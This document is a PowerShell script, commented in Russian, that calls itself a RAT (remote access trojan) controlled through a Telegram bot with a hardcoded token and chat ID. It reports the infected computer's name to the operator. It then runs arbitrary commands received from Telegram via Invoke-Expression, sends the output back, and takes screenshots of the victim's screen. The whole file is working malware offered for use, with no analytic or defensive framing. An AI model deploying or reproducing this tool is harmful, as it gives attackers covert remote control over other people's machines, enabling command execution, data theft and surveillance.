# RAT для управления через Telegram бота
# Токен бота: 8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU
# Chat ID: 8367594494

$token = "8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU"
$chatId = "8367594494"
$lastUpdateId = 0

# Функция для отправки сообщений
function Send-TelegramMessage {
    param($text)
    $url = "https://api.telegram.org/bot$token/sendMessage"
    $body = @{
        chat_id = $chatId
        text = $text
    }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
    }
    catch {
        Write-Host "Ошибка отправки сообщения: $($_.Exception.Message)"
    }
}

# Функция для получения обновлений
function Get-TelegramUpdates {
    $url = "https://api.telegram.org/bot$token/getUpdates?offset=$($lastUpdateId + 1)&timeout=30"
    try {
        $updates = Invoke-RestMethod -Uri $url -Method Get
        return $updates
    }
    catch {
        Write-Host "Ошибка получения обновлений: $($_.Exception.Message)"
        return $null
    }
}

# Функция для выполнения команд
function Invoke-CommandHandler {
    param($command)
    try {
        $output = Invoke-Expression $command 2>&1 | Out-String
        return $output
    }
    catch {
        return "Ошибка выполнения команды: $($_.Exception.Message)"
    }
}

# Основной цикл
Send-TelegramMessage "RAT активирован на машине: $env:COMPUTERNAME"

while ($true) {
    $updates = Get-TelegramUpdates
    if ($updates -and $updates.ok -eq $true) {
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            if ($update.message.text -like "/cmd*") {
                $command = $update.message.text.Substring(4).Trim()
                $output = Invoke-CommandHandler $command
                Send-TelegramMessage "Результат выполнения '$command':`n$output"
            }
            elseif ($update.message.text -eq "/screenshot") {
                # Функция для создания скриншота
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $tempFile = "$env:TEMP\screenshot.png"
                $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
                $graphics.Dispose()
                $bitmap.Dispose()
                Send-TelegramMessage "Скриншот сохранен: $tempFile"
            }
            elseif ($update.message.text -eq "/help") {
                $helpMessage = @"
Доступные команды:
/cmd [command] - выполнить команду PowerShell
/screenshot - сделать скриншот
/help - показать справку
"@
                Send-TelegramMessage $helpMessage
            }
        }
    }
    Start-Sleep -Seconds 5
}